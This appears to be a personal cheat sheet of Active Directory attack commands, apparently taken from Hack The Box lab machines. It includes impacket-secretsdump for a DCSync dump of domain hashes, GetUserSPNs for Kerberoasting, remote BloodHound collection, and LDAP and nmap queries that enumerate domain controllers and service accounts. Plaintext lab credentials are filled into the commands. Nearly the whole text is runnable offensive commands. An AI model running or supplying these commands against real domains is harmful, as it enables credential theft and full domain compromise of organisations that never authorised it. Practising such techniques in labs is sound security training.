
## secretsdump
```
impacket-secretsdump -just-dc 'svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175 -outputfile dcsync_hashes
```

## enumerate domain controller 
[https://www.g0dmode.biz/active-directory-enumeration/computer-enumeration/domain-controllers](https://www.g0dmode.biz/active-directory-enumeration/computer-enumeration/domain-controllers)

```
([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll()

net group "domain controllers" /domain

sudo nmap -Pn -T4 -p 389,636 --script ldap-rootdse <domain-controller-ip> | grep dnsHostName | sort -u
```

## remote bloodhound

[https://notes.benheater.com/books/active-directory/page/remote-bloodhound](https://notes.benheater.com/books/active-directory/page/remote-bloodhound)

```
bloodhound-python -u fsmith -p Thestrokes23 -d egotistical-bank.local -dc sauna.egotistical-bank.local -ns 10.10.10.175 -c All
```

## GetUserSPNs.py
```
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```


## ldapsearch

```
ldapsearch -H ldap://10.10.10.100 -x -D "active\SVC_TGS" -W -b DC=active,DC=htb "(objectClass=user)" | grep sAMAccountName

ldapsearch -H ldap://10.10.10.100 -x -D "active\SVC_TGS" -W -b DC=active,DC=htb "(objectClass=computer)" | grep sAMAccountName

ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
```